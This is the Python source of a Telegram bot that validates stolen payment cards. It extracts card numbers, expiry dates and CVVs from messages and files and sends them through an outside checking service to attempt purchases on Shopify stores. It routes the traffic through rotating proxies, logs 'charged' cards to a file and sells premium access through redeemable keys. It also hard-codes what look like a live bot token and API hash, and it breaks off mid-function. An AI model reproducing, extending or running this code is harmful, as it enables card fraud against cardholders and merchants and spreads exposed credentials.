from telethon import TelegramClient, events, Button
from telethon.tl.types import KeyboardButtonCallback
import requests, random, datetime, json, os, re, asyncio, time
import string
import hashlib
import aiohttp
import aiofiles
from urllib.parse import urlparse

# ────────────────────────────────────────────────────────────────
#  CONFIG
# ────────────────────────────────────────────────────────────────
API_ID = 26038836
API_HASH = "25f462e2a8517df5014a653c39cc58ca"
BOT_TOKEN = "8997685893:AAFgz9FEUnt0BJd1pBh3HWZ_YWzL7b8II4I"          # Replace with your Bot Token
ADMIN_ID = [7935621079, 8496671308, 1308204344, 7856977111, 7029965057, 5295792382, 1965289355, 8467239599, 7249106493, 7292047135, 8368859527, 7582867285]
GROUP_ID = -1003200643667

# Files
PREMIUM_FILE = "premium.json"
FREE_FILE = "free_users.json"
SITE_FILE = "user_sites.json"
KEYS_FILE = "keys.json"
CC_FILE = "cc.txt"
BANNED_FILE = "banned_users.json"
PROXY_FILE = "proxy.json"

ACTIVE_MTXT_PROCESSES = {}
TEMP_WORKING_SITES = {}

# ── PERFORMANCE CONFIGURATION (OPTIMIZED FOR SPEED) ──
SP_PER_USER_WORKERS = 50
MSP_PER_USER_WORKERS = 200
SITE_PER_USER_WORKERS = 50
BIN_WORKERS = 50

API_TIMEOUT = 60
BIN_TIMEOUT = 30

BATCH_SIZE = 150
SITE_CHECK_BATCH = 100
MAX_RETRIES = 3

# ────────────────────────────────────────────────────────────────
#  GLOBAL CACHE & SESSION
# ────────────────────────────────────────────────────────────────
_bin_cache = {}
_http_session = None

# ────────────────────────────────────────────────────────────────
#  UTILITY FUNCTIONS
# ────────────────────────────────────────────────────────────────

async def create_json_file(filename):
    try:
        if not os.path.exists(filename):
            async with aiofiles.open(filename, "w") as file:
                await file.write(json.dumps({}))
    except Exception as e:
        print(f"Error creating {filename}: {str(e)}")

async def initialize_files():
    for file in [PREMIUM_FILE, FREE_FILE, SITE_FILE, KEYS_FILE, BANNED_FILE, PROXY_FILE]:
        await create_json_file(file)

async def load_json(filename):
    try:
        if not os.path.exists(filename):
            await create_json_file(filename)
        async with aiofiles.open(filename, "r") as f:
            content = await f.read()
            return json.loads(content)
    except Exception as e:
        print(f"Error loading {filename}: {str(e)}")
        return {}

async def save_json(filename, data):
    try:
        async with aiofiles.open(filename, "w") as f:
            await f.write(json.dumps(data, indent=4))
    except Exception as e:
        print(f"Error saving {filename}: {str(e)}")

def generate_key():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))

async def is_premium_user(user_id):
    premium_users = await load_json(PREMIUM_FILE)
    user_data = premium_users.get(str(user_id))
    if not user_data:
        return False
    expiry_date = datetime.datetime.fromisoformat(user_data['expiry'])
    current_date = datetime.datetime.now()
    if current_date > expiry_date:
        del premium_users[str(user_id)]
        await save_json(PREMIUM_FILE, premium_users)
        return False
    return True

async def add_premium_user(user_id, days):
    premium_users = await load_json(PREMIUM_FILE)
    expiry_date = datetime.datetime.now() + datetime.timedelta(days=days)
    premium_users[str(user_id)] = {
        'expiry': expiry_date.isoformat(),
        'added_by': 'admin',
        'days': days
    }
    await save_json(PREMIUM_FILE, premium_users)

async def remove_premium_user(user_id):
    premium_users = await load_json(PREMIUM_FILE)
    if str(user_id) in premium_users:
        del premium_users[str(user_id)]
        await save_json(PREMIUM_FILE, premium_users)
        return True
    return False

async def is_banned_user(user_id):
    banned_users = await load_json(BANNED_FILE)
    return str(user_id) in banned_users

async def ban_user(user_id, banned_by):
    banned_users = await load_json(BANNED_FILE)
    banned_users[str(user_id)] = {
        'banned_at': datetime.datetime.now().isoformat(),
        'banned_by': banned_by
    }
    await save_json(BANNED_FILE, banned_users)

async def unban_user(user_id):
    banned_users = await load_json(BANNED_FILE)
    if str(user_id) in banned_users:
        del banned_users[str(user_id)]
        await save_json(BANNED_FILE, banned_users)
        return True
    return False

# ── SEMAPHORE MANAGER ──
_semaphores = {}

def get_semaphore(user_id, cmd_type, limit):
    key = (user_id, cmd_type)
    if key not in _semaphores:
        _semaphores[key] = asyncio.Semaphore(limit)
    return _semaphores[key]

# ── BIN LOOKUP with cache and shared session ──
_bin_sem = asyncio.Semaphore(BIN_WORKERS)

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        if bin_number in _bin_cache:
            return _bin_cache[bin_number]

        async with _bin_sem:
            timeout = aiohttp.ClientTimeout(total=BIN_TIMEOUT)
            async with _http_session.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=timeout) as res:
                if res.status != 200:
                    result = ("BIN Info Not Found", "-", "-", "-", "-", "🏳️")
                    _bin_cache[bin_number] = result
                    return result
                response_text = await res.text()
                try:
                    data = json.loads(response_text)
                    brand = data.get('brand', '-')
                    bin_type = data.get('type', '-')
                    level = data.get('level', '-')
                    bank = data.get('bank', '-')
                    country = data.get('country_name', '-')
                    flag = data.get('country_flag', '🏳️')
                    result = (brand, bin_type, level, bank, country, flag)
                    _bin_cache[bin_number] = result
                    return result
                except json.JSONDecodeError:
                    result = ("-", "-", "-", "-", "-", "🏳️")
                    _bin_cache[bin_number] = result
                    return result
    except Exception:
        result = ("-", "-", "-", "-", "-", "🏳️")
        _bin_cache[bin_number] = result
        return result

def normalize_card(text):
    if not text:
        return None
    text = text.replace('\n', ' ').replace('/', ' ')
    numbers = re.findall(r'\d+', text)
    cc = mm = yy = cvv = ''
    for part in numbers:
        if len(part) == 16:
            cc = part
        elif len(part) == 4 and part.startswith('20'):
            yy = part[2:]
        elif len(part) == 2 and int(part) <= 12 and mm == '':
            mm = part
        elif len(part) == 2 and not part.startswith('20') and yy == '':
            yy = part
        elif len(part) in [3, 4] and cvv == '':
            cvv = part
    if cc and mm and yy and cvv:
        return f"{cc}|{mm}|{yy}|{cvv}"
    return None

def extract_json_from_response(response_text):
    if not response_text:
        return None
    start_index = response_text.find('{')
    if start_index == -1:
        return None
    brace_count = 0
    end_index = -1
    for i in range(start_index, len(response_text)):
        if response_text[i] == '{':
            brace_count += 1
        elif response_text[i] == '}':
            brace_count -= 1
            if brace_count == 0:
                end_index = i
                break
    if end_index == -1:
        return None
    json_text = response_text[start_index:end_index + 1]
    try:
        return json.loads(json_text)
    except json.JSONDecodeError:
        return None

async def get_user_proxy(user_id):
    proxies = await load_json(PROXY_FILE)
    user_proxies = proxies.get(str(user_id), [])
    if not user_proxies:
        return None
    return random.choice(user_proxies)

async def remove_dead_proxy(user_id, proxy_url):
    proxies = await load_json(PROXY_FILE)
    user_proxies = proxies.get(str(user_id), [])
    for proxy_data in user_proxies:
        if proxy_data['proxy_url'] == proxy_url:
            user_proxies.remove(proxy_data)
            if user_proxies:
                proxies[str(user_id)] = user_proxies
            else:
                del proxies[str(user_id)]
            await save_json(PROXY_FILE, proxies)
            break

async def get_all_user_proxies(user_id):
    proxies = await load_json(PROXY_FILE)
    return proxies.get(str(user_id), [])

# ── API CALL using shared session ──
async def _call_shopify_api(card, site, proxy_url=None):
    proxy_param = ""
    if proxy_url:
        proxy_param = f"&proxy={proxy_url}"
    if not site.startswith(('http://', 'https://')):
        site = f"https://{site}"
    url = f"https://autosh.up.railway.app/shopii?cc={card}&site={site}{proxy_param}"
    timeout = aiohttp.ClientTimeout(total=API_TIMEOUT)
    try:
        async with _http_session.get(url, timeout=timeout) as res:
            if res.status != 200:
                return {"Response": f"HTTP_ERROR_{res.status}", "Price": "-", "Gateway": "-"}
            try:
                return await res.json()
            except:
                text = await res.text()
                return {"Response": f"Invalid JSON: {text[:100]}", "Price": "-", "Gateway": "-"}
    except asyncio.TimeoutError:
        return {"Response": "TIMEOUT", "Price": "-", "Gateway": "-"}
    except Exception as e:
        return {"Response": f"ERROR: {str(e)}", "Price": "-", "Gateway": "-"}

# ── IMPROVED DEAD SITE DETECTION ──
def is_site_dead(response_text):
    if not response_text:
        return True
    response_lower = response_text.lower()
    dead_indicators = [
        'receipt id is empty', 'handle is empty', 'product id is empty',
        'tax amount is empty', 'payment method identifier is empty',
        'invalid url', 'error in 1st req', 'error in 1 req',
        'cloudflare', 'connection failed', 'timed out',
        'access denied', 'tlsv1 alert', 'ssl routines',
        'could not resolve', 'domain name not found',
        'name or service not known', 'openssl ssl_connect',
        'empty reply from server', 'HTTPERROR504', 'http error',
        'httperror504', 'timeout', 'unreachable', 'ssl error',
        '502', '503', '504', 'bad gateway', 'service unavailable',
        'gateway timeout', 'network error', 'connection reset',
        'failed to detect product', 'failed to create checkout',
        'failed to tokenize card', 'failed to get proposal data',
        'submit rejected', 'handle error', 'http 404',
        'delivery_delivery_line_detail_changed', 'delivery_address2_required',
        'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
        'SITE DEAD', 'site dead',
        'CAPTCHA_REQUIRED', 'captcha_required', 'captcha required',
        'Site errors', 'Site errors: Failed to tokenize card', 'Failed',
        'step 0 failed', 'step 1 failed', 'step 2 failed', 'step 3 failed',
        'step 4 failed', 'step 5 failed', 'step 6 failed', 'step 7 failed',
        'step 8 failed', 'step 9 failed', 'step 10 failed',
        'missing stableid', 'missing buildid', 'missing sourcetoken',
        'could not extract signedhandles', 'signedhandles',
        'store incompatible', 'incompatible',
        'returned status', 'http error', 'http 402', 'http 403', 'http 500',
        'could not get', 'not found', 'bad request', 'unauthorized',
        'forbidden', 'internal server error', 'service unavailable',
        'gateway timeout', 'connection refused', 'connection reset',
        'tls handshake', 'ssl handshake', 'certificate verify failed',
        'proxy error', 'proxy failure', 'invalid response', 'empty response',
        'no such host', 'host unreachable', 'network is unreachable',
        'failed to fetch', 'failed to connect', 'failed to parse',
        'unexpected token', 'unexpected end of json', 'json decode error',
        'rate limit', 'too many requests', '429', 'error 429',
        'blocked', 'access blocked', 'permission denied',
        'invalid card', 'card declined', 'do not honor',
        'insufficient funds', 'cvv mismatch', 'expired card',
        'invalid expiry', 'invalid cvv'
    ]
    return any(indicator in response_lower for indicator in dead_indicators)

async def test_single_site(site, test_card="4031630422575208|01|2030|280", user_id=None):
    try:
        if not site.startswith(('http://', 'https://')):
            site = f'https://{site}'
        proxy_data = await get_user_proxy(user_id) if user_id else None
        proxy_url = proxy_data.get('proxy_url') if proxy_data else None
        result_json = await _call_shopify_api(test_card, site, proxy_url)
        if proxy_data and user_id:
            resp_text = result_json.get('Response', '')
            if any(k in resp_text.lower() for k in ['proxy', 'connection', 'timeout']):
                await remove_dead_proxy(user_id, proxy_data.get('proxy_url'))
                return {
                    "status": "proxy_dead",
                    "response": "⚠️ Proxy is dead and has been removed! Please add a new proxy using /addpxy",
                    "site": site,
                    "price": "-"
                }
        response_msg = result_json.get('Response', '')
        price = result_json.get('Price', '-')
        if price != '-':
            price = f"${price}"
        if is_site_dead(response_msg):
            return {"status": "dead", "response": response_msg, "site": site, "price": price}
        else:
            return {"status": "working", "response": response_msg, "site": site, "price": price}
    except Exception as e:
        return {"status": "dead", "response": str(e), "site": site, "price": "-"}

# ── CHECK CARD WITH RETRY (3 different sites) ──
async def check_card_with_retry(card, sites, user_id=None, max_retries=MAX_RETRIES):
    if not sites:
        return {"Response": "No sites available", "Price": "-", "Gateway": "-"}, -1, None

    tried = set()
    last_result = None
    last_site = None

    for attempt in range(max_retries):
        available = [s for s in sites if s not in tried]
        if not available:
            break
        site = random.choice(available)
        tried.add(site)

        result = await check_card_specific_site(card, site, user_id)
        if not is_site_dead(result.get("Response", "")):
            site_index = sites.index(site) + 1 if site in sites else 0
            return result, site_index, site

        last_result = result
        last_site = site
        if attempt < max_retries - 1:
            await asyncio.sleep(0.1)

    if last_result:
        site_index = sites.index(last_site) + 1 if last_site in sites else 0
        return last_result, site_index, last_site
    else:
        return {"Response": "All sites failed", "Price": "-", "Gateway": "-"}, -1, None

async def check_card_specific_site(card, site, user_id=None):
    proxy_data = await get_user_proxy(user_id) if user_id else None
    proxy_url = proxy_data.get('proxy_url') if proxy_data else None
    try:
        result_json = await _call_shopify_api(card, site, proxy_url)
        if proxy_data and user_id:
            resp_text = result_json.get('Response', '')
            if any(k in resp_text.lower() for k in ['proxy', 'connection', 'timeout']):
                await remove_dead_proxy(user_id, proxy_data.get('proxy_url'))
                return {
                    "Response": "⚠️ Proxy is dead and has been removed! Please add a new proxy using /addpxy",
                    "Price": "-",
                    "Gateway": "-",
                    "Status": "Proxy Dead"
                }
        response_msg = result_json.get('Response', '')
        price = result_json.get('Price', '-')
        if price != '-':
            price = f"${price}"
        gateway = result_json.get('Gate', 'Shopify')
        if "Order completed" in response_msg or "💎" in response_msg:
            return {
                "Response": response_msg,
                "Price": price,
                "Gateway": gateway,
                "Status": "Charged"
            }
        else:
            return {
                "Response": response_msg,
                "Price": price,
                "Gateway": gateway,
                "Status": response_msg
            }
    except Exception as e:
        return {"Response": str(e), "Price": "-", "Gateway": "-"}

def extract_card(text):
    match = re.search(r'(\d{12,16})[|\s/]*(\d{1,2})[|\s/]*(\d{2,4})[|\s/]*(\d{3,4})', text)
    if match:
        cc, mm, yy, cvv = match.groups()
        if len(yy) == 4:
            yy = yy[2:]
        return f"{cc}|{mm}|{yy}|{cvv}"
    return normalize_card(text)

def extract_all_cards(text):
    cards = set()
    for line in text.splitlines():
        card = extract_card(line)
        if card:
            cards.add(card)
    return list(cards)

async def can_use(user_id, chat):
    if await is_banned_user(user_id):
        return False, "banned"
    is_premium = await is_premium_user(user_id)
    is_private = chat.id == user_id
    if is_private:
        if is_premium:
            return True, "premium_private"
        else:
            return False, "no_access"
    else:
        if is_premium:
            return True, "premium_group"
        else:
            return True, "group_free"

def get_cc_limit(access_type, user_id=None):
    if user_id and user_id in ADMIN_ID:
        return 2000
    if access_type in ["premium_private", "premium_group"]:
        return 500
    elif access_type == "group_free":
        return 50
    return 0

async def save_approved_card(card, status, response, gateway, price):
    try:
        async with aiofiles.open(CC_FILE, "a", encoding="utf-8") as f:
            await f.write(f"{card} | {status} | {response} | {gateway} | {price}\n")
    except Exception as e:
        print(f"Error saving card to {CC_FILE}: {str(e)}")

async def pin_charged_message(event, message):
    try:
        if event.is_group:
            await message.pin()
    except Exception as e:
        print(f"Failed to pin message: {e}")

def is_valid_url_or_domain(url):
    domain = url.lower()
    if domain.startswith(('http://', 'https://')):
        try:
            parsed = urlparse(url)
        except:
            return False
        domain = parsed.netloc
    domain_pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$'
    return bool(re.match(domain_pattern, domain))

def extract_urls_from_text(text):
    clean_urls = set()
    lines = text.split('\n')
    for line in lines:
        cleaned_line = re.sub(r'^[\s\-\+\|,\d\.\)\(\[\]]+', '', line.strip()).split(' ')[0]
        if cleaned_line and is_valid_url_or_domain(cleaned_line):
            clean_urls.add(cleaned_line)
    return list(clean_urls)

def parse_proxy_format(proxy):
    import re
    proxy = proxy.strip()
    proxy_type = 'http'
    protocol_match = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
    if protocol_match:
        proxy_type = protocol_match.group(1).lower()
        proxy = protocol_match.group(2)
    host = ''
    port = ''
    username = ''
    password = ''
    match = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy)
    if match:
        username, password, host, port = match.groups()
    elif re.match(r'^([a-zA-Z0-9\.\-]+):(\d+)@([^:]+):(.+)$', proxy):
        match = re.match(r'^([a-zA-Z0-9\.\-]+):(\d+)@([^:]+):(.+)$', proxy)
        host, port, username, password = match.groups()
    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy):
        match = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy)
        potential_host, potential_port, potential_user, potential_pass = match.groups()
        if 0 < int(potential_port) <= 65535:
            host, port, username, password = potential_host, potential_port, potential_user, potential_pass
    elif re.match(r'^([^:@]+):(\d+)$', proxy):
        match = re.match(r'^([^:@]+):(\d+)$', proxy)
        host, port = match.groups()
    else:
        return None
    if not host or not port:
        return None
    try:
        port_num = int(port)
        if port_num <= 0 or port_num > 65535:
            return None
    except ValueError:
        return None
    if username and password:
        if proxy_type in ['socks5', 'socks4']:
            proxy_url = f'{proxy_type}://{username}:{password}@{host}:{port}'
        else:
            proxy_url = f'http://{username}:{password}@{host}:{port}'
    else:
        if proxy_type in ['socks5', 'socks4']:
            proxy_url = f'{proxy_type}://{host}:{port}'
        else:
            proxy_url = f'http://{host}:{port}'
    return {
        'ip': host,
        'port': port,
        'username': username if username else None,
        'password': password if password else None,
        'proxy_url': proxy_url,
        'type': proxy_type
    }

async def test_proxy(proxy_url):
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with _http_session.get('http://api.ipify.org?format=json', proxy=proxy_url, timeout=timeout) as res:
            if res.status == 200:
                data = await res.json()
                return True, data.get('ip', 'Unknown')
            return False, None
    except Exception as e:
        return False, str(e)

client = TelegramClient('cc_bot', API_ID, API_HASH)

def banned_user_message():
    return "🚫 **𝙔𝙤𝙪 𝘼𝙧𝙚 𝘽𝙖𝙣𝙣𝙚𝙙!**\n\n𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙡𝙡𝙤𝙬𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩.\n\n𝙁𝙤𝙧 𝙖𝙥𝙥𝙚𝙖𝙡, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙈𝙤𝙙_𝘽𝙮_𝙆𝙖𝙢𝙖𝙡"

def access_denied_message_with_button():
    message = "🚫 **Access Denied!** This command requires premium access or group usage."
    buttons = [[Button.url("🚀 Join Group for Free Access", "https://t.me/+pNplrRLrEGY5NTU0")]]
    return message, buttons

# ────────────────────────────────────────────────────────────────
#  BOT COMMAND HANDLERS
# ────────────────────────────────────────────────────────────────

@client.on(events.NewMessage(pattern=r'(?i)^[/.](start|cmds?|commands?)$'))
async def start(event):
    _, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned":
        return await event.reply(banned_user_message())
    text = """🚀 **Hello and welcome!**

Here are the available command categories.

** Shopify Self **
`/sh` ⇾ Check a single CC.
`/msh` ⇾ Check multiple CCs from text.
`/mtxt` ⇾ Check CCs from a `.txt` file.
`/ran` ⇾ Check CCs from `.txt` using random sites.

** Stripe Auth **
`/st` ⇾ Check a single CC.
`/mst` ⇾ Check multiple CCs from text.
`/mstxt` ⇾ Check CCs from a `.txt` file.
`/sadd` <site> ⇾ Add Stripe Auth site for ST commands.

** Bot & User Management **
`/add` <site> ⇾ Add site(s) to your DB.
`/rm` <site> ⇾ Remove site(s) from your DB.
`/check` ⇾ Test your saved sites.
`/info` ⇾ Get your user information.
`/redeem` <key> ⇾ Redeem a premium key.

** Proxy Management (Private Only) **
`/addpxy` <proxy> ⇾ Add proxy (max 10, ip:port:user:pass).
`/proxy` ⇾ View all your saved proxies.
`/rmpxy` <index|all> ⇾ Remove proxy by index or all.
"""
    if access_type in ["premium_private", "premium_group"]:
        text += f"\n💎 **Status:** Premium Access (`{get_cc_limit(access_type, event.sender_id)}` CCs)"
    else:
        text += f"\n🆓 **Status:** Group User (`{get_cc_limit(access_type, event.sender_id)}` CCs)"
    await event.reply(text)

@client.on(events.NewMessage(pattern='/auth'))
async def auth_user(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("🚫 𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙐𝙨𝙚 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙!")
    try:
        parts = event.raw_text.split()
        if len(parts) != 3:
            return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩: /auth {user_id} {days}")
        user_id = int(parts[1])
        days = int(parts[2])
        await add_premium_user(user_id, days)
        await event.reply(f"✅ 𝙐𝙨𝙚𝙧 {user_id} 𝙝𝙖𝙨 𝙗𝙚𝙚𝙣 𝙜𝙧𝙖𝙣𝙩𝙚𝙙 {days} 𝙙𝙖𝙮𝙨 𝙤𝙛 𝙥𝙧𝙚𝙢𝙞𝙪m 𝙖𝙘𝙘𝙚𝙨𝙨!")
        try:
            await client.send_message(user_id, f"🎉 𝘾𝙤𝙣𝙜𝙧𝙖𝙩𝙪𝙡𝙖𝙩𝙞𝙤𝙣𝙨!\n\n𝙔𝙤𝙪 𝙝𝙖𝙫𝙚 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 𝙧𝙚𝙙𝙚𝙚𝙢𝙚𝙙 {days} 𝙙𝙖𝙮𝙨 𝙤𝙛 𝙥𝙧𝙚𝙢𝙞𝙪𝙢 𝙖𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙣𝙤𝙬 𝙪𝙨𝙚 𝙩𝙝𝙚 𝙗𝙤𝙩 𝙞𝙣 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙘𝙝𝙖𝙩 𝙬𝙞𝙩𝙝 500 𝘾𝘾 𝙡𝙞𝙢𝙞𝙩!")
        except:
            pass
    except ValueError:
        await event.reply("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙪𝙨𝙚𝙧 𝙄𝘿 𝙤𝙧 𝙙𝙖𝙮𝙨!")
    except Exception as e:
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

@client.on(events.NewMessage(pattern='/key'))
async def generate_keys(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("🚫 𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙐𝙨𝙚 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙!")
    try:
        parts = event.raw_text.split()
        if len(parts) != 3:
            return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩: /key {amount} {days}")
        amount = int(parts[1])
        days = int(parts[2])
        if amount > 10:
            return await event.reply("❌ 𝙈𝙖𝙭𝙞𝙢𝙪𝙢 10 𝙠𝙚𝙮𝙨 𝙖𝙩 𝙤𝙣𝙘𝙚!")
        keys_data = await load_json(KEYS_FILE)
        generated_keys = []
        for _ in range(amount):
            key = generate_key()
            keys_data[key] = {'days': days, 'created_at': datetime.datetime.now().isoformat(), 'used': False, 'used_by': None}
            generated_keys.append(key)
        await save_json(KEYS_FILE, keys_data)
        keys_text = "\n".join([f"🔑 `{key}`" for key in generated_keys])
        await event.reply(f"✅ 𝙂𝙚𝙣𝙚𝙧𝙖𝙩𝙚𝙙 {amount} 𝙠𝙚𝙮(𝙨) f𝙤𝙧 {days} 𝙙𝙖𝙮(𝙨):\n\n{keys_text}")
    except ValueError:
        await event.reply("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙖𝙢𝙤𝙪𝙣𝙩 𝙤𝙧 𝙙𝙖𝙮s!")
    except Exception as e:
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

@client.on(events.NewMessage(pattern='/redeem'))
async def redeem_key(event):
    if await is_banned_user(event.sender_id):
        return await event.reply(banned_user_message())
    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩: /redeem {key}")
        key = parts[1].upper()
        keys_data = await load_json(KEYS_FILE)
        if key not in keys_data:
            return await event.reply("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙠𝙚𝙮!")
        if keys_data[key]['used']:
            return await event.reply("❌ 𝙏𝙝𝙞𝙨 𝙠𝙚𝙮 𝙝𝙖𝙨 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙗𝙚𝙚𝙣 𝙪𝙨𝙚𝙙!")
        if await is_premium_user(event.sender_id):
            return await event.reply("❌ 𝙔𝙤𝙪 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙝𝙖𝙫𝙚 𝙥𝙧𝙚𝙢𝙞𝙪𝙢 𝙖𝙘𝙘𝙚𝙨𝙨!")
        days = keys_data[key]['days']
        await add_premium_user(event.sender_id, days)
        keys_data[key]['used'] = True
        keys_data[key]['used_by'] = event.sender_id
        keys_data[key]['used_at'] = datetime.datetime.now().isoformat()
        await save_json(KEYS_FILE, keys_data)
        await event.reply(f"🎉 𝘾𝙤𝙣𝙜𝙧𝙖𝙩𝙪𝙡𝙖𝙩𝙞𝙤𝙣𝙨!\n\n𝙔𝙤𝙪 𝙝𝙖𝙫𝙚 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 𝙧𝙚𝙙𝙚𝙚𝙢𝙚𝙙 {days} 𝙙𝙖𝙮𝙨 𝙤𝙛 𝙥𝙧𝙚𝙢𝙞𝙪𝙢 𝙖𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙣𝙤𝙬 𝙪𝙨𝙚 𝙩𝙝𝙚 𝙗𝙤𝙩 𝙞𝙣 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙘𝙝𝙖𝙩 𝙬𝙞𝙩𝙝 500 𝘾𝘾 𝙡𝙞𝙢𝙞𝙩!")
    except Exception as e:
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

@client.on(events.NewMessage(pattern='/add'))
async def add_site(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned":
        return await event.reply(banned_user_message())
    try:
        add_text = event.raw_text[4:].strip()
        if not add_text:
            return await event.reply("𝙁𝙤𝙧𝙢𝙚𝙩: /add site.com site.com")
        sites_to_add = extract_urls_from_text(add_text)
        if not sites_to_add:
            return await event.reply("❌ 𝙉𝙤 𝙫𝙖𝙡𝙞𝙙 𝙪𝙧𝙡𝙨/𝙙𝙤𝙢𝙖𝙞𝙣𝙨 𝙛𝙤𝙪𝙣𝙙!")
        sites = await load_json(SITE_FILE)
        user_sites = sites.get(str(event.sender_id), [])
        added_sites = []
        already_exists = []
        for site in sites_to_add:
            if site in user_sites:
                already_exists.append(site)
            else:
                user_sites.append(site)
                added_sites.append(site)
        sites[str(event.sender_id)] = user_sites
        await save_json(SITE_FILE, sites)
        response_parts = []
        if added_sites:
            response_parts.append("\n".join(f"✅ 𝙎𝙞𝙩𝙚 𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 𝘼𝙙𝙙𝙚𝙙: {s}" for s in added_sites))
        if already_exists:
            response_parts.append("\n".join(f"⚠️ 𝘼𝙡𝙧𝙚𝙖𝙙𝙮 𝙀𝙭𝙞𝙨𝙩𝙨: {s}" for s in already_exists))
        if response_parts:
            await event.reply("\n\n".join(response_parts))
        else:
            await event.reply("❌ 𝙉𝙤 𝙣𝙚𝙬 𝙨𝙞𝙩𝙚𝙨 𝙩𝙤 𝙖𝙙𝙙!")
    except Exception as e:
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

@client.on(events.NewMessage(pattern='/rm'))
async def remove_site(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned":
        return await event.reply(banned_user_message())
    try:
        rm_text = event.raw_text[3:].strip()
        if not rm_text:
            return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩: /rm site.com")
        sites_to_remove = extract_urls_from_text(rm_text)
        if not sites_to_remove:
            return await event.reply("❌ 𝙉𝙤 𝙫𝙖𝙡𝙞𝙙 𝙪𝙧𝙡𝙨/𝙙𝙤𝙢𝙖𝙞𝙣𝙨 𝙛𝙤𝙪𝙣𝙙!")
        sites = await load_json(SITE_FILE)
        user_sites = sites.get(str(event.sender_id), [])
        removed_sites = []
        not_found_sites = []
        for site in sites_to_remove:
            if site in user_sites:
                user_sites.remove(site)
                removed_sites.append(site)
            else:
                not_found_sites.append(site)
        sites[str(event.sender_id)] = user_sites
        await save_json(SITE_FILE, sites)
        response_parts = []
        if removed_sites:
            response_parts.append("\n".join(f"✅ 𝙍𝙚𝙢𝙤𝙫𝙚𝙙: {s}" for s in removed_sites))
        if not_found_sites:
            response_parts.append("\n".join(f"❌ 𝙉𝙤𝙩 𝙁𝙤𝙪𝙣𝙙: {s}" for s in not_found_sites))
        if response_parts:
            await event.reply("\n\n".join(response_parts))
        else:
            await event.reply("❌ 𝙉𝙤 𝙨𝙞𝙩𝙚𝙨 𝙬𝙚𝙧𝙚 𝙧𝙚𝙢𝙤𝙫𝙚𝙙!")
    except Exception as e:
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

# ── Proxy Commands ──

@client.on(events.NewMessage(pattern='/addpxy'))
async def add_proxy(event):
    if event.is_group:
        return await event.reply("🔒 𝙏𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙤𝙣𝙡𝙮 𝙬𝙤𝙧𝙠𝙨 𝙞𝙣 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙘𝙝𝙖𝙩 𝙩𝙤 𝙥𝙧𝙤𝙩𝙚𝙘𝙩 𝙮𝙤𝙪𝙧 𝙥𝙧𝙤𝙭𝙮!")
    if await is_banned_user(event.sender_id):
        return await event.reply(banned_user_message())
    try:
        parts = event.raw_text.split(maxsplit=1)
        if len(parts) != 2:
            return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩: /addpxy ip:port:username:password\n")
        proxy_str = parts[1].strip()
        proxy_data = parse_proxy_format(proxy_str)
        if not proxy_data:
            return await event.reply("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙥𝙧𝙤𝙭𝙮 𝙛𝙤𝙧𝙢𝙖𝙩!\n\n𝙐𝙨𝙚: ip:port:username:password\n")
        proxies = await load_json(PROXY_FILE)
        user_proxies = proxies.get(str(event.sender_id), [])
        if len(user_proxies) >= 10:
